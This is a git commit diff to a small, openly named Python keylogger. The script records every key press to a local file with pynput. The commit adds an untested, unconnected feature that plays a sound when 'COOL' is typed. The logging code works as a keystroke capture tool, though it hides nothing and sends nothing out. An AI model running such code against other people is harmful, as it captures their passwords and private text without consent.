70fbec08705e9ddabb268de52d337d58923a2a7a
qingyueniu <qingyue-niu@utexas.edu>
2018-10-16 13:23:11 -0500

    Adding playing sound(haven't test)

--- newKeylogger.py
+++ newKeylogger.py
@@ -1,8 +1,11 @@
 from pynput.keyboard import Key, Listener
+from playsound import playsound
 import logging, os
+from queue import *
 
 #log_dir = os.path.expanduser('~/Desktop')
 log_dir = ''
+q = Queue()
 
 logging.basicConfig(filename=(log_dir + 'Key_log.txt'),
                     level=logging.DEBUG,
@@ -11,5 +14,19 @@ logging.basicConfig(filename=(log_dir + 'Key_log.txt'),
 def on_press(key):
     logging.info(key)
 
+def check(m):
+    nextChar=q.get()
+    if(nextChar != m.upper()):
+        reload()
+    if(q.empty()):
+        playsound('cool.wav')
+        reload();
+    
+def reload():
+    q.put("C")
+    q.put("O")
+    q.put("O")
+    q.put("L")  
+    
 with Listener(on_press=on_press) as listener:
     listener.join()
